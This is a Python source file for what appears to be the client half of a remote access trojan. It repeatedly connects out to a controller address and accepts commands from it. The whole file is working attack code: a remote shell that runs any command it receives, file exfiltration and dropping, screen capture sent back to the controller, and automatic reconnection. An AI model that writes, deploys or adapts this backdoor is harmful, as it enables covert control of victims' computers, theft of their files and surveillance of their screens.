import socket
import sys
import os
import time
import subprocess
import mss

#TODO:
#Error handing
    # Shell cmds
    # File management
    


address = ("0.0.0.0", 3000)

def take_screen_shot():
    if len(mss.mss().monitors) > 0:
        raw_pixels = mss.mss().grab(mss.mss().monitors[0])
        img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
        send(img_data)

        del(raw_pixels, img_data)

def recv(buff_size=1024):
    data_size = int(server_con.recv(12).decode())
    
    data = bytes()
    while len(data) < data_size:
        data += server_con.recv(buff_size)

    return data

def send(data):
    header_size = 12
    data_size = f"{len(data):^{header_size}}"
    server_con.send(data_size.encode())
    server_con.sendall(data)

def upload_file(file_name):
    try:
        with open(file_name, "rb") as file:
            file_data = file.read()
            send(file_data)
        done = recv().decode()
        print(done)
        
    except:
        print("Error opening file")
        send(b'')

def download_file(file_name, file_path):
    file_data = recv()
    if not file_data:
        print("Could not download file...")
        return
        
    try:
        file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
        file.write(file_data)
        file.close()
        send(b"DONE")
    except OSError as e:
        print(e)

def open_shell():
    while True:
        print("waiting for cmd...")
        data = recv()
        str_msg = b""
        
        if not data:
            continue
        
        data = data.decode()
        
        if data == "exit":
            break
        elif data[:2] == "cd":
            dir = data[3:]
            try:
                os.chdir(dir)
            except FileNotFoundError as e:
                str_msg = str(e).encode()
            else:
                str_msg = os.getcwd().encode()

        elif data[:2] == "dw":
            file_name = data[3:]
            print(f"Uploading File...{file_name}")
            upload_file(file_name)
            continue

        elif data[:2] == "up":
            file_name = data[3:]
            print(f"Downloading File...{file_name}")
            download_file(file_name=file_name, file_path=os.getcwd())
            continue

        output = subprocess.Popen(f'{data}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
        str_msg = output[0] + output[1]

        send(str_msg)




def establish_connection(address):
    global server_con

    print("Connecting...")
    while True:
        try:
            server_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_con.connect((address[0],address[1]))
            print(f"Connected!\nServer: {address[0]}:{address[1]}")
        except:
            time.sleep(3)
        else:
            break


def main():
    establish_connection(address)

    while True:
        choice = recv().decode()
        if choice == "1":
            print("Opening Shell...")
            open_shell()
        elif choice == "2":
            take_screen_shot()
        elif choice == "3":
            pass
        elif choice == "4":
            keep_alive = recv().decode()
            if keep_alive.lower() == "y" or keep_alive.lower() == "yes":
                server_con.shutdown(socket.SHUT_WR)
                server_con.close()
                time.sleep(5)
                establish_connection(address)
            else:
                break

    server_con.close()

main()
